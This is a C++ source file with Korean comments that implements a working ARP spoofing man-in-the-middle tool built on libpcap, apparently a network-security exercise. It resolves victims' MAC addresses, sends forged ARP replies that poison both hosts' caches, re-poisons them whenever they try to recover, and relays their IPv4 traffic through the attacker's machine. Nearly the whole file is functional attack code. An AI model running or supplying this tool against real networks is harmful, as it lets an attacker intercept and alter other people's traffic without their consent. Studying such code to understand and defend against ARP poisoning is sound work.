#include "arpspoofmanager.h"

#include <cstdio>
#include <chrono>
#include <cstring>
#include <arpa/inet.h>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
// === 이더넷 헤더와 ARP 헤더가 붙어 있는 실제 전송용 패킷 형태다.
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

ArpSpoofManager::ArpSpoofManager(pcap_t* pcap, const Mac& attackerMac, const Ip& attackerIp)
    : pcap_(pcap), attackerMac_(attackerMac), attackerIp_(attackerIp) {
}

bool ArpSpoofManager::sendArpRequest(const Ip& ip) const {
    EthArpPacket request;

    // === "누가 이 IP를 쓰는가?"를 모든 장비에게 묻는 ARP request를 구성한다.
    request.eth_.dmac_ = Mac::broadcastMac();
    request.eth_.smac_ = attackerMac_;
    request.eth_.type_ = htons(EthHdr::Arp);

    request.arp_.hrd_ = htons(ArpHdr::ETHER);
    request.arp_.pro_ = htons(EthHdr::Ip4);
    request.arp_.hln_ = Mac::Size;
    request.arp_.pln_ = Ip::Size;
    request.arp_.op_ = htons(ArpHdr::Request);
    request.arp_.smac_ = attackerMac_;
    request.arp_.sip_ = htonl(attackerIp_);
    request.arp_.tmac_ = Mac::nullMac();
    request.arp_.tip_ = htonl(ip);

    int result = pcap_sendpacket(pcap_, reinterpret_cast<const u_char*>(&request), sizeof(request));
    if (result != 0) {
        std::fprintf(stderr, "failed to send ARP request: %s\n", pcap_geterr(pcap_));
        return false;
    }
    return true;
}

bool ArpSpoofManager::resolveMac(const Ip& ip, Mac& mac) const {
    if (!sendArpRequest(ip))
        return false;

    auto start = std::chrono::steady_clock::now();
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* data;
        int res = pcap_next_ex(pcap_, &header, &data);

        if (res == 1) {
            if (header->caplen < sizeof(EthArpPacket))
                continue;

            const EthArpPacket* reply = reinterpret_cast<const EthArpPacket*>(data);

            // === ARP reply이면서, 우리가 찾는 IP가 보낸 응답인지 확인한다.
            if (reply->eth_.type() != EthHdr::Arp)
                continue;
            if (reply->arp_.op() != ArpHdr::Reply)
                continue;
            if (reply->arp_.sip() != ip)
                continue;

            mac = reply->arp_.smac();
            return true;
        }

        if (res == -1) {
            std::fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap_));
            return false;
        }

        auto elapsed = std::chrono::steady_clock::now() - start;
        if (elapsed > std::chrono::seconds(5)) {
            std::fprintf(stderr, "ARP reply timeout for %s\n", std::string(ip).c_str());
            return false;
        }
    }
}

bool ArpSpoofManager::initializeSession(SpoofSession& session) const {
    // === sender와 target의 MAC 주소를 둘 다 알아야 이후 감염/릴레이가 가능하다.
    return resolveMac(session.senderIp, session.senderMac) &&
           resolveMac(session.targetIp, session.targetMac);
}

bool ArpSpoofManager::sendArpReply(const Mac& receiverMac, const Ip& receiverIp, const Ip& claimedIp) const {
    EthArpPacket packet;

    // === 수신자에게 claimedIp의 주인이 공격자 MAC인 것처럼 속이는 reply를 만든다.
    packet.eth_.dmac_ = receiverMac;
    packet.eth_.smac_ = attackerMac_;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attackerMac_;
    packet.arp_.sip_ = htonl(claimedIp);
    packet.arp_.tmac_ = receiverMac;
    packet.arp_.tip_ = htonl(receiverIp);

    int result = pcap_sendpacket(pcap_, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
    if (result != 0) {
        std::fprintf(stderr, "failed to send infection packet: %s\n", pcap_geterr(pcap_));
        return false;
    }
    return true;
}

bool ArpSpoofManager::infectSender(const SpoofSession& session) const {
    // === sender 입장에서는 target IP가 공격자 MAC으로 보이게 만든다.
    return sendArpReply(session.senderMac, session.senderIp, session.targetIp);
}

bool ArpSpoofManager::infectTarget(const SpoofSession& session) const {
    // === target 입장에서는 sender IP가 공격자 MAC으로 보이게 만든다.
    return sendArpReply(session.targetMac, session.targetIp, session.senderIp);
}

bool ArpSpoofManager::infect(const SpoofSession& session) const {
    return infectSender(session) && infectTarget(session);
}

bool ArpSpoofManager::infectAll(const std::vector<SpoofSession>& sessions) const {
    // === 여러 sender/target 쌍을 한 번에 처리할 수 있도록 세션별로 감염을 반복한다.
    for (const SpoofSession& session : sessions) {
        if (!infect(session))
            return false;
    }
    return true;
}

const SpoofSession* ArpSpoofManager::findSessionBySender(
    const std::vector<SpoofSession>& sessions, const Mac& srcMac, const Mac& dstMac) const {
    for (const SpoofSession& session : sessions) {
        // === 감염된 뒤에는 프레임 목적지가 공격자 MAC으로 오므로 그 조합으로 세션을 찾는다.
        if (srcMac == session.senderMac && dstMac == attackerMac_)
            return &session;
        if (srcMac == session.targetMac && dstMac == attackerMac_)
            return &session;
    }
    return nullptr;
}

bool ArpSpoofManager::matchesRecoverPacket(const SpoofSession& session, const u_char* packet, uint32_t length) const {
    if (length < sizeof(EthArpPacket))
        return false;

    const EthArpPacket* arpPacket = reinterpret_cast<const EthArpPacket*>(packet);
    if (arpPacket->eth_.type() != EthHdr::Arp)
        return false;

    // === 두 호스트가 서로에게 "진짜 MAC은 이거야"라고 다시 알리는 정상화 시도를 감지한다.
    const bool senderRecover =
        arpPacket->eth_.smac() == session.targetMac &&
        arpPacket->arp_.sip() == session.targetIp &&
        arpPacket->arp_.tip() == session.senderIp;

    const bool targetRecover =
        arpPacket->eth_.smac() == session.senderMac &&
        arpPacket->arp_.sip() == session.senderIp &&
        arpPacket->arp_.tip() == session.targetIp;

    return senderRecover || targetRecover;
}

bool ArpSpoofManager::relayPacket(const u_char* packet, uint32_t length, const Mac& dstMac) const {
    if (length < sizeof(EthHdr))
        return false;

    // === 원본 페이로드는 유지하고, 이더넷 헤더의 출발지/목적지 MAC만 바꿔 재전송한다.
    std::vector<u_char> forwarded(packet, packet + length);
    EthHdr* eth = reinterpret_cast<EthHdr*>(forwarded.data());
    eth->smac_ = attackerMac_;
    eth->dmac_ = dstMac;

    int result = pcap_sendpacket(pcap_, forwarded.data(), int(forwarded.size()));
    if (result != 0) {
        std::fprintf(stderr, "failed to relay packet: %s\n", pcap_geterr(pcap_));
        return false;
    }
    return true;
}

void ArpSpoofManager::relayLoop(const std::vector<SpoofSession>& sessions) const {
    // === 감염이 유지되는 동안 계속 패킷을 관찰하면서 재감염과 트래픽 중계를 수행한다.
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap_, &header, &packet);

        if (res == 0)
            continue;

        if (res == -1 || res == -2) {
            std::fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap_));
            return;
        }

        if (header->caplen < sizeof(EthHdr))
            continue;

        const EthHdr* eth = reinterpret_cast<const EthHdr*>(packet);

        for (const SpoofSession& session : sessions) {
            // === 상대가 ARP 캐시를 복구하려 하면 즉시 다시 감염시켜 공격 상태를 유지한다.
            if (matchesRecoverPacket(session, packet, header->caplen)) {
                infect(session);
                break;
            }
        }

        // === 실제 릴레이 대상은 IPv4 데이터 프레임만 처리한다.
        if (eth->type() != EthHdr::Ip4)
            continue;

        const SpoofSession* session = findSessionBySender(sessions, eth->smac(), eth->dmac());
        if (session == nullptr)
            continue;

        // === sender -> target, target -> sender 양방향 모두 공격자를 거쳐가도록 다시 전송한다.
        if (eth->smac() == session->senderMac) {
            relayPacket(packet, header->caplen, session->targetMac);
        } else if (eth->smac() == session->targetMac) {
            relayPacket(packet, header->caplen, session->senderMac);
        }
    }
}
